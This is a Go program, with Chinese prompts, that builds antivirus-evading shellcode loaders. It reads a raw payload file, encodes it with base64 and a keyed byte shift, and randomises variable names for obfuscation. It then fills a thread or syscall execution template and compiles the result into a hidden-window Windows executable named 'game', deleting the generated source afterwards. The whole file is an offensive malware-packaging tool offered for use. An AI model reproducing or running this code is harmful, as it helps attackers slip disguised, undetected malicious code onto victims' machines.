package main

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"os/exec"
	"strings"
	"time"
)

var (
	key          []byte
	keys         string
	keyName      string
	decodeName   string
	genName      string
	gd           string
	bbdataName   string
	shellCodeHex string
	bdata        string
)

func init() {
	fmt.Println("[*]初始化混淆参数")
	//初始化key
	key = getKey()
	//key变量名
	keyName = randString(5)
	//解码方法名
	decodeName = randString(6)
	//生成exe方法名
	genName = randString(6)
	//混淆方法名
	gd = randString(6)

	//base64变量
	bbdataName = randString(4)

	shellCodeHex = randString(4)
}

func getKey() []byte {
	keys = randString(2)
	b := []byte(keys)
	return b
}

func randString(l int) string {
	str := "abcdefghijklmnopqrstuvwxyz_"
	bytes := []byte(str)
	result := []byte{}
	x := time.Now().UnixNano() * 6
	y := time.Now().UnixNano() * 4
	r := rand.New(rand.NewSource(x + y))
	time.Sleep(1000)
	for i := 0; i < l; i++ {
		result = append(result, bytes[r.Intn(len(bytes))])
	}
	ddd := string(result)
	fmt.Println(ddd)
	return ddd
}

func getEnCode(data []byte) string {
	bdata1 := base64.StdEncoding.EncodeToString(data)
	bydata1 := []byte(bdata1)
	var shellcode []byte

	for i := 0; i < len(bydata1); i++ {
		shellcode = append(shellcode, bydata1[i]+key[0]-key[1])
	}
	return base64.StdEncoding.EncodeToString(shellcode)
}

func gen(code *string) {
	//payload
	*code = strings.ReplaceAll(*code, "$bdata", bdata)
	//payload名
	*code = strings.ReplaceAll(*code, "$bbdata", bbdataName)
	*code = strings.ReplaceAll(*code, "$keyName", keyName)
	*code = strings.ReplaceAll(*code, "$keys", keys)
	*code = strings.ReplaceAll(*code, "$shellCodeHex", shellCodeHex)
	*code = strings.ReplaceAll(*code, "$gd", gd)
	//*code=strings.ReplaceAll(*code, "$gdNum", ss)
	*code = strings.ReplaceAll(*code, "$genEXE", genName)
	*code = strings.ReplaceAll(*code, "$getDeCode", decodeName)

}

func main() {

	path := "payload.bin"
	templ := make(map[string]string)

	templ["1"] = "syscall"
	templ["2"] = "createThread"

	var path1 string
	var tpl string
	var hide string
	fmt.Println("[*]请输入shellcode路径[默认./payload.bin]")
	fmt.Scanln(&path1)
	fmt.Println(path1)
	if path1 != "" {
		path = path1
	}
	fmt.Println("[*]请输入免杀方式[默认1]")
	fmt.Scanln(&tpl)
	fmt.Println(tpl)

	fmt.Println("[*]是否隐藏窗口[Y/n]")
	fmt.Scanln(&hide)
	fmt.Println(hide)

	sc, err := ioutil.ReadFile(path)
	if err != nil || len(sc) == 0 {
		fmt.Println("[-]请检查输入的payload!")
		return
	}

	bdata = getEnCode(sc)
	fmt.Println("[+]获取payload", "---->", path)
	//fmt.Println(bdata)
	time.Sleep(1 * time.Second)
	//ioutil.WriteFile("shellcode.txt", []byte(bdata), 0666)
	fmt.Println("[*]解析shellcode模板")
	time.Sleep(1 * time.Second)
	//tmpl, _ := ioutil.ReadFile("./syscal")
	tmpl, _ := ioutil.ReadFile("./createThread")
	code := string(tmpl)
	fmt.Println("[*]生成shellcode")
	time.Sleep(1 * time.Second)

	gen(&code)
	ioutil.WriteFile("shellcode.go", []byte(code), 0666)

	fmt.Println("[*]编译shellcode")
	time.Sleep(1 * time.Second)

	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -o game.exe ./shellcode.go")
	//隐藏窗口，如有需要自行替换
	//cmd := exec.Command("cmd.exe", "/c", "go build -ldflags=-s -ldflags=-H=windowsgui -o game.exe ./shellcode.go")
	cmd := exec.Command("cmd.exe", "/c", "go", "build", "-ldflags", "-H windowsgui -s -w", "shellcode.go", "-o game"+string(time.Now().UnixNano())+".exe")
	//阻塞至等待命令执行完成
	err1 := cmd.Run()
	if err1 != nil {
		panic(err1)
	}
	fmt.Println("[+]生成 game.exe")
	os.Remove("shellcode.go")

}
